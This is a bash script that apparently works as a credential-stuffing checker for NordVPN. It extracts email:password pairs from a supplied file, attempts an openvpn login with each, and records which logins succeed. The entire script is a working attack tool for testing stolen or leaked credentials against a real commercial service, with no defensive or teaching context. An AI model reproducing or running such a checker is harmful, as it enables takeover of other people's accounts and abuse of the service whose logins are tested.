#!/bin/bash

cd "$(dirname "$0")"
# Colorize
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 191)
BLUE=$(tput setaf 4)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0) 

: > checklog.txt
CREDS=($(grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}[:][A-Za-z0-9]+\b" $1))

for ((i=0; i < ${#CREDS[*]}; i++))
	do
	openvpn --config nordvpn.com.udp.ovpn --route-noexec --auth-user-pass <(echo -e "${CREDS[i]//:/\\n}") --log ovpn.log --daemon
	sleep 8;
	if [[ -z $(grep "AUTH_FAILED" ovpn.log) ]]
                then
                printf '%s\n' "Login ${GREEN}SUCCESS${NORMAL} ${CREDS[i]}"
                printf '%s\n' "Login SUCCESS ${CREDS[i]}" >> checklog.txt
		else
                printf '%s\n' "Login ${RED}FAILED${NORMAL} ${CREDS[i]}"
                printf '%s\n' "Login FAILED ${CREDS[i]}"  >> checklog.txt

        fi
kill 15 $(pgrep openvpn)
done

